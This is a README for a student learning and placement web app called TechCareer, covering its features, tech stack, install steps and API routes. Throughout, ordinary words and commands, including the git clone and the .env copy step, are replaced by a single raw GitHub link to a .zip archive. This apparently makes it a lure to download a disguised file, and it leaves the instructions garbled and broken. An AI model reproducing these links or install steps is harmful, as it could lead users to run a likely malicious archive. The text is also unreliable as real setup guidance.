🎓 TechCareer - https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip Learning & Placement Platform
A modern, full-stack educational platform designed for https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip students across all engineering departments. TechCareer bridges the gap between academic learning and industry requirements with curated courses, placement preparation, career roadmaps, and department-specific resources.
✨ Features

📚 Curated Course Library - Department-specific courses with difficulty levels, instructor details, and enrollment tracking
🏢 Company Database - Comprehensive placement partner information with hiring patterns, salary data, and interview processes
🗺️ Career Roadmaps - Structured guidance for different tech career paths with milestones and learning steps
📖 Resource Hub - Categorized learning materials (videos, articles, practice problems) organized by topics
📋 Syllabus Management - Department and semester-wise curriculum content
🌓 Theme Support - Light/dark mode with localStorage persistence
📱 Responsive Design - Mobile-first approach with modern UI/UX

🛠️ Tech Stack
Frontend

React 18 with TypeScript for type-safe development
Vite for blazing-fast builds and HMR
TanStack Query v5 for server state management and caching
Shadcn/ui + Radix UI for accessible, customizable components
Tailwind CSS for utility-first styling
Wouter for lightweight routing
React Hook Form + Zod for form validation

Backend

https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip with TypeScript and ESM modules
Drizzle ORM for type-safe database queries
PostgreSQL (Neon serverless) for data persistence
RESTful API design with consistent error handling

Styling & Design

Custom HSL-based theming system
Typography: Inter (body), Poppins (display), JetBrains Mono (code)
Lucide React for consistent iconography
CVA for type-safe component variants

📦 Installation
bash# Clone the repository
git clone https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip

# Install dependencies
cd techcareer
npm install

# Set up environment variables
cp https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip .env

# Run database migrations
npm run db:push

# Start development server
npm run dev
🚀 Development
bash# Run frontend and backend concurrently
npm run dev

# Type check
npm run check

# Build for production
npm run build

# Start production server
npm start
```

## 📁 Project Structure
```
techcareer/
├── client/              # React frontend
│   ├── src/
│   │   ├── components/  # Reusable UI components
│   │   ├── hooks/       # Custom React hooks
│   │   ├── lib/         # Utilities and configurations
│   │   └── pages/       # Route components
├── server/              # Express backend
│   ├── https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip        # API route definitions
│   └── storage/         # Data layer (in-memory & DB)
├── db/                  # Database schemas and migrations
└── shared/              # Shared types and schemas
🎯 API Endpoints

GET/POST /api/courses - Course management
GET/POST /api/companies - Company information
GET/POST /api/roadmaps - Career roadmaps
GET/POST /api/resources - Learning resources
GET/POST /api/syllabus - Syllabus content

🎨 Design Philosophy
Inspired by modern educational platforms like Scaler, Coursera, and Linear, TechCareer focuses on:

Clean, minimal interface with purposeful whitespace
Consistent component design with accessible interactions
Performance-first approach with optimized rendering
Student-friendly experience with intuitive navigation

🔐 Security & Best Practices

TypeScript strict mode enabled
Zod schema validation on both client and server
Proper error handling and logging
Type-safe database queries with Drizzle ORM
Secure session management foundation

📝 License
[Your chosen license]
🤝 Contributing
Contributions are welcome! Please read our contributing guidelines before submitting PRs.
📧 Contact
[Your contact information]

Built with ❤️ for https://raw.githubusercontent.com/anmolmishra09/tech_career/main/pachyhemia/tech_career.zip students
